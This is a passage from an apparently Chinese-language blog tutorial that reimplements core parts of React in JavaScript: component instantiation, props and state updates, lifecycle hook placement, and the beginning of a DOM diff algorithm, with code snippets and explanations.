<span class="title function_">render</span>(<span class="params">vnode, container</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> container.<span class="title function_">appendChild</span>(<span class="title function_">_render</span>(vnode));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_render</span>(<span class="params">vnode</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (vnode === <span class="literal">undefined</span> || vnode === <span class="literal">null</span> || <span class="keyword">typeof</span> vnode === <span class="string">&quot;boolean&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 1. 如果 tag 是函数，则渲染函数组件</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> vnode.<span class="property">tag</span> === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 1. 创建组件</span></span><br><span class="line">    <span class="keyword">const</span> comp = <span class="title function_">createComponent</span>(vnode.<span class="property">tag</span>, vnode.<span class="property">attrs</span>);</span><br><span class="line">    <span class="comment">// 2. 设置组件 props 并渲染组件</span></span><br><span class="line">    <span class="title function_">setComponentProps</span>(com, vnode.<span class="property">attrs</span>);</span><br><span class="line">    <span class="comment">// 3. 组件渲染后的 DOM 对象返回</span></span><br><span class="line">    <span class="keyword">return</span> comp.<span class="property">base</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2. 如果 vnode 是字符串</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> vnode === <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3. 否则就是一个虚拟 DOM 对象</span></span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> dom;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-2-createComponent"><a href="#3-2-createComponent" class="headerlink" title="3.2 createComponent"></a>3.2 createComponent</h2><p>在 <code>_render()</code> 函数中，如果传入的是一个函数或 class 组件，首先要实现一个 <code>createComponent</code> 方法，来将组件进行 <strong>实例化</strong>，最终的实例化对象上会有一个 <code>render()</code> 方法来生成具体的虚拟 DOM 对象。</p><p>以下是 <code>createComponent</code> 方法的具体实现：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createComponent</span>(<span class="params">comp, props</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> inst;</span><br><span class="line">  <span class="keyword">if</span> (comp.<span class="property"><span class="keyword">prototype</span></span> &amp;&amp; comp.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">render</span>) &#123;</span><br><span class="line">    inst = <span class="keyword">new</span> <span class="title function_">comp</span>(props); <span class="comment">// (1)</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    inst = <span class="keyword">new</span> <span class="title class_">Component</span>(props); <span class="comment">// (2)</span></span><br><span class="line">    inst.<span class="property">constructor</span> = comp; <span class="comment">// (3)</span></span><br><span class="line">    inst.<span class="property">render</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">constructor</span>(<span class="params">props</span>);</span><br><span class="line">    &#125;; <span class="comment">// (4)</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> inst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们传入的是一个 class 组件，那么直接将其进行实例化，<strong>注意此时组件就会执行构造函数的 <code>constructor</code> 部分，如进行 state 的初始化</strong>，最终实例化后的对象上会挂载一个 <code>render</code> 方法（1）；</p><p>但如果我们传入的是一个函数组件，我们要将其构造为一个 class 组件，在构造为一个 class 组件之前，我们需要首先声明 <code>Component</code> 类：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// component.js</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props = &#123;&#125;</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">props</span> = props;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Component</span>;</span><br></pre></td></tr></table></figure><p>首先我们实例化一个 <code>Component</code> 对象，作为我们即将改造的“初始对象”，此时要注意将组件属性 <code>props</code> 传入，这样在组件对象上才能取到传入的 <code>props</code>（2）；之后我们将函数组件的函数体挂载到生成的 Component 对象的 <code>constructor</code> 上，我们这一步是改写了生成的 Component 对象的构造方法（3），目前来看意义不大；之后，我们将生成的 Component 对象的 <code>render()</code> 方法改写为函数组件的函数体（4），这样就将一个函数组件改写为了 class 组件。</p><h2 id="3-3-setComponentProps"><a href="#3-3-setComponentProps" class="headerlink" title="3.3 setComponentProps"></a>3.3 setComponentProps</h2><p><code>setComponentProps</code> 方法负责对组件的 props 进行更新，并触发组件的渲染：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">setComponentProps</span>(<span class="params">comp, props</span>) &#123;</span><br><span class="line">  comp.<span class="property">props</span> = props;</span><br><span class="line">  <span class="title function_">renderComponent</span>(comp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>其实，在目前组件执行初次渲染时 <code>comp.props = props</code> 的执行是没有意义的，因为在执行 <code>createComponent</code> 组件实例化时，就已经完成了对 props 的挂载。我们在这里再重新挂载一次是因为该方法不仅在组件初始化时调用，也会在组件更新时调用。当组件更新时，直接调用该方法就可以直接完成 props 的更新以及组件的重新渲染。</p></blockquote><h2 id="3-4-renderComponent"><a href="#3-4-renderComponent" class="headerlink" title="3.4 renderComponent"></a>3.4 renderComponent</h2><p>在调用 <code>renderComponent</code> 之前，我们已经完成了对函数组件、class 组件的实例化，并且将外部传入的组件属性挂载到了实例化对象的 <code>props</code> 属性上，同时实例化好的组件对象上有用 <code>render()</code> 方法，执行后可以返回一个虚拟节点对象。</p><p>因此，在 <code>renderComponent</code> 方法中，我们主要是调用组件的 <code>render()</code> 函数（1），然后再将生成的虚拟节点对象传入到 <code>_render()</code> 函数中，渲染为真实的 DOM 对象，并将 DOM 对象挂载到组件实例的 base 属性上（2）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">renderComponent</span>(<span class="params">comp</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> renderer = comp.<span class="title function_">render</span>(); <span class="comment">// (1)</span></span><br><span class="line">  comp.<span class="property">base</span> = <span class="title function_">_render</span>(renderer); <span class="comment">// (2)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="4-生命周期"><a href="#4-生命周期" class="headerlink" title="4. 生命周期"></a>4. 生命周期</h1><p>在上一节中，我们已经完善了组件的渲染过程，那么在本章节中，我们将还原 React 组件<a href="https://zh-hans.reactjs.org/docs/react-component.html#the-component-lifecycle">生命周期函数</a>的调用过程。我们将着重探讨 <code>componentWillMount</code> <code>componentDidMount</code> <code>componentWillUpdate</code> <code>componentDidUpdate</code> 这四个生命周期函数。</p><h2 id="4-1-componentWillMount-与-componentDidMount"><a href="#4-1-componentWillMount-与-componentDidMount" class="headerlink" title="4.1 componentWillMount 与 componentDidMount"></a>4.1 componentWillMount 与 componentDidMount</h2><blockquote><p>UNSAFE_componentWillMount() 在挂载之前被调用。它在 render() 之前调用，因此在此方法中同步调用 setState() 不会触发额外渲染。</p></blockquote><p>根据以上的特性我们很容易判断出 <code>componentWillMount</code> 的执行位置，让其在 <code>renderComponent()</code> 之前执行并且仅执行一次即可：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">_render</span>(<span class="params">vnode</span>) &#123;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> vnode.<span class="property">tag</span> === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> comp = <span class="title function_">createComponent</span>(vnode.<span class="property">tag</span>, vnode.<span class="property">attrs</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!comp.<span class="property">base</span>) &#123;</span><br><span class="line">      comp?.<span class="title function_">componentWillMount</span>();</span><br><span class="line">    &#125; <span class="comment">// 执行 componentWillMount</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_">renderComponent</span>(comp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> comp.<span class="property">base</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... ... </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>componentDidMount() 会在组件挂载后（插入 DOM 树中）立即调用。依赖于 DOM 节点的初始化应该放在这里。如需通过网络请求获取数据，此处是实例化请求的好地方。</p></blockquote><p><code>componentDidMount</code> 要在组件完成挂载时执行，且只执行一次，那么在 <code>renderComponent</code> 过程中，我们可以将其放置在组件渲染完成并且是初次挂载时执行。</p><blockquote><p>!!! 此处教程有误，componentDidMount 应该在组件 DOM 挂载到页面上后再执行，按照下面的写法显然实在 DOM 被挂载之前执行  !!!</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">renderComponent</span>(<span class="params">comp</span>) &#123;</span><br><span class="line">  <span class="comment">// 对组件进行渲染，获取虚拟节点对象</span></span><br><span class="line">  <span class="keyword">const</span> renderer = comp.<span class="title function_">render</span>();</span><br><span class="line">  <span class="keyword">let</span> base = <span class="title function_">_render</span>(renderer);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!comp.<span class="property">base</span>) &#123;</span><br><span class="line">    comp?.<span class="title function_">componentDidMount</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  comp.<span class="property">base</span> = base;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-2-componentWillUpdate-与-componentDidUpdate"><a href="#4-2-componentWillUpdate-与-componentDidUpdate" class="headerlink" title="4.2 componentWillUpdate 与 componentDidUpdate"></a>4.2 componentWillUpdate 与 componentDidUpdate</h2><p>要执行这两个方法，我们首先要实现组件内部 state 的更新以及重新渲染，我们先编写一个如下的 demo 组件：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Home</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">      <span class="attr">num</span>: <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Handle</span></span><br><span class="line">  <span class="title function_">handleClick</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">      <span class="attr">num</span>: <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">num</span> + <span class="number">1</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;home&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;this.props.title&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>hello, react!<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;this.handleClick.bind(this)&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          Click me! (&#123;this.state.num&#125;)</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/14/3aBXAwJmQlzVtKx.png" alt=""></p><p>当用户点击按钮后，state 中存放的 num 变量就会被加一，然后页面会触发重新渲染，来展示整个页面。</p><p>要实现 state 的变更以及重新渲染，我们首先要扩展一下 Component 组件：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+ import &#123; renderComponent &#125; from &quot;../react-dom/index&quot;;</span></span><br><span class="line"></span><br><span class="line">  class Component &#123;</span><br><span class="line">    constructor(props = &#123;&#125;) &#123;</span><br><span class="line">      this.props = props;</span><br><span class="line">      this.state = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="addition">+   setState(stateChange) &#123;</span></span><br><span class="line"><span class="addition">+     Object.assign(this.state, stateChange); // (1)</span></span><br><span class="line"><span class="addition">+     renderComponent(this); // (2)</span></span><br><span class="line"><span class="addition">+   &#125;</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">export default Component;</span><br></pre></td></tr></table></figure><p>我们为 <code>Component</code> 添加 <code>setState</code> 方法，此时我们为了方便编写 demo，只是简单的将 state 进行了浅拷贝并覆盖值（1），实际的 setState 操作是异步的。进行了赋值操作之后，我们重新调用 <code>renderComponent</code> 方法对组件进行重新渲染，并将当前组件作为渲染对象传入（2）。</p><p>此时我们点击按钮后，会发现页面上的 DOM 结构并不会改变，但是在 <code>renderComponent</code> 方法中打印出当前的组件对象，其 base 上挂载的 HTMLElement 的确是已经发生了更新，这就说明我们并没有将更新后的 HTMLElement 挂载到页面上。</p><p>更新节点的方法其实也很简单，我们只需要获取到当前组件的父节点，然后使用 <code>replaceChild()</code> 方法，替换父节点的内容为最新的组件节点就可以了（1）。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  export function renderComponent(comp) &#123;</span><br><span class="line">    // 对组件进行渲染，获取虚拟节点对象</span><br><span class="line">    const renderer = comp.render();</span><br><span class="line">    let base = _render(renderer);</span><br><span class="line"></span><br><span class="line"><span class="addition">+   // 节点替换</span></span><br><span class="line"><span class="addition">+   if (comp?.base?.parentNode) &#123;</span></span><br><span class="line"><span class="addition">+     comp.base.parentNode.replaceChild(base, comp.base); // (1)</span></span><br><span class="line"><span class="addition">+   &#125;</span></span><br><span class="line"></span><br><span class="line">    comp.base = base;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这时，我们根据 <code>componentWillUpdate</code> 与 <code>componentDidUpdate</code> 的定义，就很容易得知其执行的位置：</p><blockquote><p>当组件收到新的 props 或 state 时，会在渲染之前调用 UNSAFE_componentWillUpdate()。使用此作为在更新发生之前执行准备更新的机会。初始渲染不会调用此方法。</p></blockquote><blockquote><p>componentDidUpdate() 会在更新后会被立即调用。首次渲染不会执行此方法。</p></blockquote><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  export function renderComponent(comp) &#123;</span><br><span class="line">    const renderer = comp.render();</span><br><span class="line">    let base = _render(renderer);</span><br><span class="line"></span><br><span class="line"><span class="addition">+   if (comp.base) &#123;</span></span><br><span class="line"><span class="addition">+     comp?.componentWillUpdate(comp.props, comp.state);</span></span><br><span class="line"><span class="addition">+   &#125; else &#123;</span></span><br><span class="line"><span class="addition">+     comp.base = base; // 组件必须在挂载后再触发 componentDidMount</span></span><br><span class="line"><span class="addition">+     comp?.componentDidMount();</span></span><br><span class="line"><span class="addition">+   &#125;</span></span><br><span class="line"></span><br><span class="line">    if (comp?.base?.parentNode) &#123;</span><br><span class="line">      comp.base.parentNode.replaceChild(base, comp.base);</span><br><span class="line"><span class="addition">+     comp.base = base;</span></span><br><span class="line"><span class="addition">+     comp?.componentDidUpdate();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="deletion">-   comp.base = base;</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="5-Diff-算法的实现"><a href="#5-Diff-算法的实现" class="headerlink" title="5. Diff 算法的实现"></a>5. Diff 算法的实现</h1><p>截至目前，我们已经刨析了 jsx 的渲染以及组件 state 的更新，那么接下来我们会进一步对渲染流程进行优化。</p><p>在前面的写法中，每当 state 改变触发组件重新渲染时，都会从头开始进行渲染，这样对性能的损耗是很大的。为了优化 DOM 结构的更新性能，react 引入了 diff 算法，这个算法会对比每个<strong>同级节点的变更</strong>，如果当前节点与之前相较发生了变更，就会更新当前节点与其子节点，这比重新渲染整个 DOM 结构要高效的多。</p><p><img src="https://i.loli.net/2021/04/24/fZUiX1TAMw2aI8F.png" alt=""></p><p>总而言之,我们的diff算法有两个原则：</p><ul><li>对比当前真实的DOM和虚拟DOM,在对比过程中直接更新真实DOM</li><li>只对比同一层级的变化</li></ul><h2 id="5-1-起步"><a href="#5-1-起步" class="headerlink" title="5.1 起步"></a>5.1 起步</h2><p>先修改render函数,将_render方法渲染的方式改为我们即将写的diff算法方式</p><p><code>/react-dom/index.js</code></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> diff <span class="keyword">from</span> <span class="string">&#x27;./diff&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">ReactDOM</span> = &#123;</span><br><span class="line">    render</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">render</span>(<span class="params">vnode, container</span>) &#123;</span><br><span class="line">    <span class="comment">// return container.appendChild(_render(vnode));</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">diff</span>(dom,vnode,container);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由上面的<code>diff()</code>可以看出,传入了 <code>真实DOM对象,虚拟DOM对象,根元素</code></p><h2 id="5-2-实现"><a href="#5-2-实现" class="headerlink" title="5.2 实现"></a>5.2 实现</h2><p>实现一个diff算法,它的作用是对比真实的DOM和虚拟DOM,最后返回更新后的DOM</p><p><code>/react-dom/diff.js</code></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">dom:真实DOM</span></span><br><span class="line"><span class="comment">vnode:虚拟DOM</span></span><br><span class="line"><span class="comment">container: 容器</span></span><br><span class="line"><span class="comment">return : 更新后的DOM</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">diff</span>(<span class="params">dom,vnode,container</span>) &#123;</span><br><span class="line">    <span class="comment">// 返回更新后的节点</span></span><br><span class="line">    <span class="keyword">let</span> ret =  <span class="title function_">diffNode</span>(dom,vnode);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">diffNode</span>(<span class="params">dom,vnode</span>)&#123;</span><br><span class="line"><span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来实现这个方法</p><p>在这之前先来回忆一下我们虚拟DOM的结构:</p><p>虚拟DOM的结构可以分为三种,分别表示文本,原生DOM节点以及组件</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原生DOM节点的vnode</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">tag</span>: <span class="string">&#x27;div&#x27;</span>,</span><br><span class="line">    <span class="attr">attrs</span>: &#123;</span><br><span class="line">        <span class="attr">className</span>: <span class="string">&#x27;container&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">children</span>: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文本节点的vnode</span></span><br><span class="line"><span class="string">&quot;hello,world&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 组件的vnode</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">tag</span>: <span class="title class_">ComponentConstrucotr</span>,</span><br><span class="line">    <span class="attr">attrs</span>: &#123;</span><br><span class="line">        <span class="attr">className</span>: <span class="string">&#x27;container&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">children</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-3-对比文本节点"><a href="#5-3-对比文本节点" class="headerlink" title="5.3 对比文本节点"></a>5.3 对比文本节点</h2><p>首先考虑最简单的文本节点,如果当前的DOM就是文本节点,则直接更新内容,否则就新建一个文本节点,并移除原来的DOM</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">diffNode</span>(<span class="params">dom,vnode</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> out = dom;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> vnode === <span class="string">&#x27;string&#x27;</span>)&#123;</span><br><span class="line">      <span class="comment">// 如果当前的dom是文本节点,则直接更新内容</span></span><br><span class="line">      <span class="keyword">if</span>(dom &amp;&amp; dom.<span class="property">nodeType</span> === <span class="number">3</span>)&#123;</span><br><span class="line">          <span class="keyword">if</span>(dom.<span class="property">textContent</span> !== vnode) dom.<span class="property">textContent</span> = vnode;</span><br><span class="line">      &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//  如果dom不是文本节点,则新建一个文本节点dom,并移除原来的dom</span></span><br><span class="line">        out = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(vnode);</span><br><span class="line">        <span class="keyword">if</span>(dom &amp;&amp; dom.<span class="property">parentNode</span>)&#123;</span><br><span class="line">            dom.<span class="property">parentNode</span>.<span class="title function_">replaceChild</span>(out,dom);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文本节点十分简单,它没有属性,也没有子元素</p><h2 id="5-4-对比组件"><a href="#5-4-对比组件" class="headerlink" title="5.4 对比组件"></a>5.4 对比组件</h2><p>之前也说过,react组件分为函数组件和类组件,我们定制一个方法<code>diffComponent</code></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> setComponentProps <span class="keyword">from</span> <span class="string">&quot;./index.js&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">diffNode</span>(<span class="params">dom,vnode</span>)&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="comment">//如果是一个组件</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> vnode.<span class="property">tag</span> === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">diffComponent</span>(dom, vnode);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">diffComponent</span>(<span class="params">dom, vnode</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> comp = dom;</span><br><span class="line">    <span class="comment">// 如果组件没有变化,则重新设置 props;   执行</span></span><br><span class="line">    <span class="keyword">if</span> (comp &amp;&amp; comp.<span class="property">constructor</span> === vnode.<span class="property">tag</span>) &#123;</span><br><span class="line">        <span class="comment">// 重新设置 props 并渲染</span></span><br><span class="line">        <span class="title function_">setComponentProp</span>(comp, vnode.<span class="property">attrs</span>);</span><br><span class="line">        <span class="comment">// 赋值</span></span><br><span class="line">        dom = comp.<span class="property">base</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> 